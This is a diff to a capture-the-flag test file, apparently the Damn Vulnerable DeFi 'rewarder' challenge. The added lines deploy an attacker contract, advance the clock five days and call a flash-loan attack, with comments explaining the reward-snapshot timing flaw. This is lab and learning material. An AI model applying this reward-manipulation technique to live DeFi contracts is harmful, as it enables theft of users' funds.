@@ -66,6 +66,15 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        //The key is in the way the rewarder Pool is built as when a 5 day period is reached the first person to deposit will
+        //update the snapshot, the issue here is that the accountability tokens are minted before the snapshot is taken. If someone else
+        //deposits before me, then the attack would not work as the snapshot would have already been taken and my balance will not be
+        //positive.
+        const AttackTheRewarderPoolFactory = await ethers.getContractFactory('AttackTheRewarderPool', attacker);
+        let attackerContract = await AttackTheRewarderPoolFactory.deploy(this.flashLoanPool.address, this.liquidityToken.address, this.rewarderPool.address, this.rewardToken.address);
+        //advance 5 days. It would be time waited
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        await attackerContract.attack(TOKENS_IN_LENDER_POOL);
     });
 
     after(async function () {
